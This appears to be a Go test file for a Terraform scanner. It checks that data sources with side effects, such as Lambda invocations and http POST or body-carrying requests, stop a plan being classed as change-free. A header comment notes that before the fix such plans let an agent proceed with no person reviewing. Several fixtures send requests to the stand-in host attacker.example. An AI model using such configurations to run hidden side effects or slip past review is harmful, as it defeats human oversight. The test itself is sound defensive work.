package tfscan

import (
	"fmt"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/google/go-cmp/cmp"
)

// TestRedTeamSideEffectingDataSources holds the Terraform scanner to finding the data sources whose
// read is an execution: aws_lambda_invocation, which invokes a function during plan, and http with
// a write method or a request body, which sends a request with a side effect. Before the fix only
// the external data source was found, so a plan carrying these classified change_free and an agent's
// plan of it went ahead with no person.
func TestRedTeamSideEffectingDataSources(t *testing.T) {
	t.Parallel()
	tests := []struct {
		// Config is the configuration scanned.
		Config string
		// WantChangeFree is whether the scan should classify the plan as change free.
		WantChangeFree bool
		// WantAddr is a finding address the scan must report, empty when none is expected.
		WantAddr string
	}{{ // Test 0: A Lambda invocation data source runs the function during plan.
		Config: `data "aws_lambda_invocation" "run" {
  function_name = "do-it"
  input         = "{}"
}`,
		WantChangeFree: false, WantAddr: "data.aws_lambda_invocation.run",
	}, { // Test 1: An http POST sends a request with a side effect during plan.
		Config: `data "http" "poke" {
  url    = "https://attacker.example/ingest"
  method = "POST"
}`,
		WantChangeFree: false, WantAddr: "data.http.poke",
	}, { // Test 2: An http data source with a request body is a write whatever its method.
		Config: `data "http" "body" {
  url          = "https://attacker.example/ingest"
  request_body = "fire"
}`,
		WantChangeFree: false, WantAddr: "data.http.body",
	}, { // Test 3: A method decided only when the run plans cannot be read as a safe GET.
		Config: `data "http" "dynamic" {
  url    = "https://attacker.example/ingest"
  method = var.method
}`,
		WantChangeFree: false, WantAddr: "data.http.dynamic",
	}, { // Test 4: A plain GET http read changes nothing and stays change free, the control.
		Config: `data "http" "read" {
  url = "https://example.com/status"
}`,
		WantChangeFree: true,
	}, { // Test 5: An ordinary read-only data source stays change free, the control.
		Config: `data "aws_ami" "ubuntu" {
  most_recent = true
}`,
		WantChangeFree: true,
	}}
	for testNum, test := range tests {
		t.Run(fmt.Sprintf("test %d", testNum), func(t *testing.T) {
			t.Parallel()
			fsys := fstest.MapFS{"main.tf": {Data: []byte(test.Config)}}
			scan := Scan(fsys, ".", Options{Tool: "terraform", Place: "the project"})
			if diff := cmp.Diff(test.WantChangeFree, scan.ChangeFree()); diff != "" {
				t.Errorf("change free mismatch (-want +got):\n%s\nfindings=%v", diff, scan.Findings)
			}
			if test.WantAddr == "" {
				return
			}
			found := false
			for _, f := range scan.Findings {
				if strings.Contains(f, test.WantAddr) {
					found = true
				}
			}
			if !found {
				t.Errorf("findings %v name no %q", scan.Findings, test.WantAddr)
			}
		})
	}
}
